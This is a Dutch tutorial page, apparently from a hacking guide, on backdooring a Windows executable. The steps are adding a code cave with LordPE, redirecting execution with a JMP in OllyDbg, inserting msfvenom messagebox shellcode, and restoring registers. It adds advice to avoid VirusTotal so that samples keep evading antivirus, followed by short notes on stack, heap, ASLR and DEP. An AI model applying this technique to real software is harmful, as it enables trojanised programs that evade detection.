<p>Om een executable te backdooren heb je een aantal tools nodig. De eerste is <a href="http://www.ollydbg.de/">OllyDbg</a>, dit is een debugger voor Windows applicaties die gewoon onder Windows draait. De tweede is <a href="https://www.aldeid.com/wiki/LordPE">LordPE</a>, met deze applicatie kan je allerlei beheerstaken verrichten op executables.</p>
<p>In het voorbeeld wat hier gebruikt zal worden maak ik gebruik van Windows 10. Dit om te laten zien dat je met deze relatief oude tooling toch nog een goed resultaat kunt bereiken. Let wel op, in Windows 10 heeft een applicatie bij elke keer dat je het opnieuw opstart een nieuwe ASLR locatie. Je zult deze zelf even moeten bijhouden en bijwerken.</p>
<p>** <a href="https://en.wikipedia.org/wiki/Code_cave">Code cave</a> maken **
Allereerst laden we de gekozen applicatie in in LordPE. Hierna klik je op sections, in de verschenen tabel klik je met de rechter muisknop en klik je op &quot;Add section header&quot;. Er verschijnt een nieuwe sectie, .NewSec. Klik deze sectie opnieuw aan met de rechter muisknop en verander de VSize en de RSize in de gewenste grote. <strong>Let op,</strong> dit zijn hexadecimale getallen. 0x500 is groot genoeg.</p>
<p>Waarschijnlijk doet de executable het op dit moment niet meer, dit komt omdat de code cave die wij zojuist aangemaakt hebben nog niet bestaat. Open het bestand in je favoriete hex editor en voeg aan het einde 500 null bytes toe. </p>
<p>Open vervolgens de applicatie in OllyDbg, en druk in de menubalk op de blauwe M. Zoek hier in de nieuwe sectie op en noteer het adres.</p>
<p><strong>Execution flow</strong>
Vervolgens is het de bedoeling dat we de controle krijgen over de execution flow van het proces. Gebruik de F8 toets om verder te gaan in de executable, totdat je op het punt bent aangekomen dat je de eerste call ziet in het de executable. Selecteer deze instructie en de vijf instructies hierna, kopieer deze en plak ze in een kladblok. </p>
<p>Dubbelklik vervolgens op deze call en vervang die voor een JMP instructie naar de cave:</p>
<pre><code>JMP &lt; code cave adres &gt;
</code></pre>

<p>Selecteer vervolgens de aanpassing, en druk op rechter muisknop-&gt;copy to executable-&gt;Selected, sluit het verschenen venster en kies een bestandsnaam of doe rechtermuisknop, save -&gt; to file en selecteer een bestandsnaam. Maak van deze instructie een software breakpoint met F2. Herstart het programma met ctrl+F2.</p>
<p>Als het programma opnieuw gestart is druk je op F9 om direct door te springen naar de eerste breakpoint. Hierna druk je 1 keer op F7. Je ziet dat je nu in de geheugenrange van je code cave aanbeland bent. Als hier nu nog informatie staat, dan selecteer je alles vanaf het begin van je code cave en klik je op je rechter muisknop. Onder het kopje binairy klik je vervolgens op &quot;Fill with 00's&quot;. Je vult het geselecteerde stuk dan met null bytes. Sla wederom je aanpassingen op.</p>
<p><strong>De payload genereren</strong>
Voor deze oefening maken we een payload aan met MSFvenom. Deze payload is een windows messagebox die op popt met een melding. Ik neem niet de moeite om andere inhoud in deze messagebox te zetten, maar ik weerhoud je nergens van. Om de payload te genereren gebruik je het volgende commando:</p>
<pre><code>msfvenom -p windows/messagebox -f hex
</code></pre>

<p>De hexcode die je terug krijgt plak je even in je notitieblokje.</p>
<p><strong>De shellcode plaatsen</strong>
Om de shellcode te plaatsen, en na het uitvoeren de applicatie ook weer correct te kunnen draaien, zullen wij eerst de registers en de <a href="https://en.wikipedia.org/wiki/FLAGS_register">EFLAGS</a> moeten opslaan. Om de <a href="https://en.wikipedia.org/wiki/X86#Purpose">registers</a> op te slaan maken wij gebruik van de assembly instructie PUSHAD. PUSHAD staat ons toe om in 1 instructie alle registers op de stack te pushen, (EAX, ECX, EDX, EBX, ESP, EBP, ESI en EDI) en PUSHFD doet hetzelfde, maar dan voor alle EFLAGS.</p>
<p>Hierna selecteer je de met MSFVenom gegenereerde shellcode, deze plak je met een binairy paste direct achter de PUSHFD. Je zult nu zien dat je shellcode verschijnt. Sla de aanpassingen wederom op en herstart de applicatie. Druk op F9, F7 en zet een breakpoint op de eerste regel van je shellcode. Druk nogmaals op F9. Je zult zien dat je programma nu tot aan de eerste regel van de assembly uitgevoerd is. Kijk naar de registerwaarde van ESP. Noteer deze, die gaan we later gebruiken om de stack weer te alignen.</p>
<p>Scroll nu naar het einde van je shellcode, zet direct na de shellcode een breakpoint. Druk nu op F9, en kijk weer naar de waarde van ESP. Je zult zien dat deze waarde kleiner is dan de waarde die je eerst had. Dit is het aantal bytes die je op de stack opgeschoven bent. Aangezien wij willen dat het programma weer normaal uit kan voeren is het noodzakelijk dat wij de registers terug gaan zetten. Om de registers terug te zetten moeten wij alleen wel de stackpointer zo hebben staan dat wij de juiste waarden terug POP'en.</p>
<p>Om de offset te berekenen openen wij in windows de calculator en zetten wij hem in de hexadecimale modus:</p>
<pre><code>&lt; Eerste ESP &gt; - &lt; Tweede ESP &gt; = offset
</code></pre>

<p>Wij gaan dit getal nu automatisch in assembly bij de ESP op laten tellen, direct na de shellcode dubbelklikken wij dus en tikken wij:</p>
<pre><code>ADD ESP,0&lt; offset &gt;
</code></pre>

<p>Als ESP weer goed gaat, gaan we in omgekeerde volgorde de flags en registers weer terug zetten:</p>
<pre><code>POPFD
POPAD
</code></pre>

<p><strong>Execution flow herstellen</strong>
Om te zorgen dat het programma waar wij onze backdoor in plaatsen, zonder foutmeldingen, blijft functioneren moeten wij de overschreven instructie weer aanroepen. Je moet een CALL doen op de eerste functie die je helemaal aan het begin in een notepad had geplakt (denk aan ASLR). We plaatsen dus het volgende:</p>
<pre><code>CALL &lt; adres &gt;
</code></pre>

<p>en om te zorgen dat het programma hierna de rest van de flow oppakt jumpen wij naar de tweede instructie (denk aan ASLR) toe:</p>
<pre><code>JMP &lt; adres tweede instructie &gt;
</code></pre>

<p>**Let op: ** Als je je executable tegen verschillende virusscanners wilt testen, maak dan <strong>nooit</strong> gebruik van <a href="https://www.virustotal.com">VirusTotal</a>. VirusTotal is een samenwerkingsverband van verschillende anti-virus bedrijven. De samples die je opvraagt worden naar hen, en andere veiligheidsonderzoekers, verspreid. De door jou zo zorgvuldig gemaakte sample zal dan snel genoeg niet meer werken.</p>
<h2>Geheugenbeheer</h2>
<h3>Stack</h3>
<p>De stack is een voor een proces gereserveerd stukje geheugen waarin een proces al zijn tijdelijke variabelen opgeslagen worden. Het is een LIFO lijst (Last In First Out). Als een aangeroepen functie, met de daarbij behorende argumenten, beëindigd is popt het systeem deze waarden van de stack af. </p>
<p>De stack groeit naar beneden, het begint bij hoge geheugenadressen en werkt naar de lage adressen toe. Overigens, voor array's geld dat het geheugenbereik aan elkaar vast moet zitten. De stack groeit bij een array dus precies de andere kant op.  </p>
<h3>Heap</h3>
<p>De heap is per proces gereserveerd, en is een poel geheugen waarbinnen een applicatie een geheugen reservering kan doen. Bij de heap zal je dus ook zelf het beheer van het geheugengebruik moeten doen. Het grote voordeel van de heap is dat je variabelen overal overal in je applicatie, mits de pointer natuurlijk bekend is, gebruikt kunnen worden. </p>
<h2>Beveiligingsmechanismen</h2>
<h3>ASLR</h3>
<p>Address Space Layout Randomization is een techniek waarmee het uitbuiten van zwakheden in het geheugen lastiger gemaakt is. Dit bereikt men door de beginpunten van onder andere de applicatie, de heap, de stack en imports te randomiseren. Doordat deze geheugenpunten verschillen is het voor een aanvaller lastiger om een (betrouwbare) exploit te ontwikkelen.</p>
<p>Omdat je als aanvaller het geheugenpunt meestal zal moeten raden, is de kans aanzienlijk dat je fout gokt. Als je fout gokt zal een applicatie meestal zijn uitvoering staken.   </p>
<h3>DEP</h3>
<p>DEP, voluit Data Execution Prevention, (<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366553(v=vs.85).aspx">Windows</a> is een methode waarmee Microsoft tracht te voorkomen dat een kwaadwillende code kan uitvoeren in een geheugenbereik die als non-executable gemarkeerd is. Aangezien DEP pas geïntroduceerd is in <a href="https://en.wikipedia.org/wiki/Windows_XP">Windows XP</a> <a href="https://en.wikipedia.org/wiki/Windows_XP#Service_Pack_2">SP2</a>, is dit OS met <a href="https://en.wikipedia.org/wiki/Windows_XP#Service_Pack_1">SP1</a> uitermate geschikt om in te oefenen.</p>
<p>Er bestaan onder Windows twee varianten van DEP, namelijk de softwarematige DEP en de hardwarematige DEP. De softwarematige DEP beschermd niet tegen het uitvoeren van code in het geheugen maar juist wel tegen een SEH overflow.</p>
<p>Hardwarematige DEP is, in Windows, pas geïntroduceerd in <a href="https://nl.wikipedia.org/wiki/Windows_Vista">Windows Vista</a>. Bij hardwarematige DEP word er een expliciet stukje geheugen aangemerkt als niet uitvoerbaar en dit zal door de processor worden afgedwongen. Voor een verdere uitleg hierover zie het kopje NX-Bit.</p>
<h3>NX-Bit</h3>
<h3>RELRO</h3>
<h3>Canary</h3>
<h3>SSP</h3>
<h3>PIE</h3>
<h1>Dankwoord</h1>
<p>Proofreaders, zonder jullie trouwe leeshulp stonden hier nog meer fouten :-) 
Github, bedankt voor het hosten :)</p>
<p>Wil jij ook opgenomen worden in dit dankwoord? Begin dan met bijdragen op de <a href="https://github.com/gatochhacken/gatochhacken.github.io">github</a>. Dit kan je doen door actief contributes te doen, of door issues aan te maken met fouten/requests die je graag wilt zien.</p>
<!-- Global site tag (gtag.js) - Google Analytics -->
<p><script async src="https://www.googletagmanager.com/gtag/js?id=UA-118698551-1"></script></p>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-118698551-1');
</script>

</body>
</html>
<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
